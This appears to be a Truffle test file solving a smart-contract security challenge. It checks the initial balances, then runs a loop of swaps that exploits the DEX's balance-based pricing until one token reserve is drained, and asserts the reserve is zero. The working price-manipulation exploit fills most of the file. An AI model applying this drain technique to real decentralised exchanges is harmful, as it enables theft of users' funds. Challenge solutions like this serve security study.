const Hacker = artifacts.require("Hacker");
const Dex = artifacts.require("Dex");
const SwappableToken = artifacts.require("SwappableToken");
const { expect } = require("chai");
const { BN, expectRevert } = require("@openzeppelin/test-helpers");
const { MAX_UINT256 } = require("@openzeppelin/test-helpers/src/constants");

/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker]) {
  let hackerContract, dexContract, token1Contract, token2Contract;

  beforeEach(async function () {
    hackerContract = await Hacker.deployed();
    dexContract = await Dex.deployed();
    token1Contract = await SwappableToken.at(await dexContract.token1());
    token2Contract = await SwappableToken.at(await dexContract.token2());
  });

  it("should check game state", async function () {
    expect(await token1Contract.balanceOf(dexContract.address)).to.be.bignumber.equal(new BN(100));
    expect(await token1Contract.balanceOf(_hacker)).to.be.bignumber.equal(new BN(10));
    expect(await token2Contract.balanceOf(dexContract.address)).to.be.bignumber.equal(new BN(100));
    expect(await token2Contract.balanceOf(_hacker)).to.be.bignumber.equal(new BN(10));
    expect(await dexContract.get_swap_price(token1Contract.address, token2Contract.address, 1)).to.be.bignumber.equal(new BN(1));
  });

  it("should drain the dex", async function () {
    // approve tokens
    token1Contract.approve(dexContract.address, MAX_UINT256, { from: _hacker });
    token2Contract.approve(dexContract.address, MAX_UINT256, { from: _hacker });

    console.log("Start price manipulating...");
    // price manipulating
    let token1DexBalance;
    let token2DexBalance;
    let expensiveToken;
    let cheapToken;
    let swapAmount;
    let dexBalance;
    while (true) {
      token1DexBalance = (await token1Contract.balanceOf(dexContract.address)).toNumber();
      token2DexBalance = (await token2Contract.balanceOf(dexContract.address)).toNumber();
      expensiveToken = token1DexBalance >= token2DexBalance ? token2Contract : token1Contract;
      cheapToken = token1DexBalance >= token2DexBalance ? token1Contract : token2Contract;
      swapAmount = (await expensiveToken.balanceOf(_hacker)).toNumber();
      dexBalance = (await expensiveToken.balanceOf(dexContract.address)).toNumber();
      if (swapAmount > dexBalance) swapAmount = dexBalance;
      console.log(
        `Swap price: ${await expensiveToken.symbol()} -> ${await cheapToken.symbol()} - ${await dexContract.get_swap_price(
          expensiveToken.address,
          cheapToken.address,
          swapAmount,
        )}`,
      );
      await dexContract.swap(expensiveToken.address, cheapToken.address, swapAmount, { from: _hacker });
      console.log(
        `Balances: TKN1/DEX - ${await token1Contract.balanceOf(dexContract.address)}, TKN2/DEX - ${await token2Contract.balanceOf(
          dexContract.address,
        )}, TKN1/HACKER - ${await token1Contract.balanceOf(_hacker)}, TKN2/HACKER - ${await token2Contract.balanceOf(_hacker)}`,
      );
      if (swapAmount === dexBalance) break;
    }

    expect((await cheapToken.balanceOf(dexContract.address)).isZero()).to.be.equal(true);
    expectRevert.unspecified(dexContract.get_swap_price(cheapToken.address, expensiveToken.address, 1));
  });
});
